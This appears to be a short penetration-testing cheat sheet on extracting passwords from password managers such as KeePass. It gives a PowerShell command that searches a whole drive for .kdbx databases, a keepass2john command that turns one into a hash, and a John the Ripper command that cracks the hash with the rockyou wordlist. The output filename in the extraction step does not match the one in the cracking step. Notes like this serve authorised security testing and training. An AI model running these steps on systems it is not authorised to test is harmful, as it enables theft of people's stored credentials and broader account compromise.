# Password Manager
Getting passwords from password managers such as 1Password or Keepass.

* Search which kind of database or files does the password manager use. Example: Keepass use .kdbx
* Find that kind of file: Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
* Try to get that file as hash with John The Ripper: keepass2john Database.kdbx > keepass.hash
* Crack the hash: john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash.hash

* More details: https://www.thedutchhacker.com/how-to-crack-a-keepass-database-file/
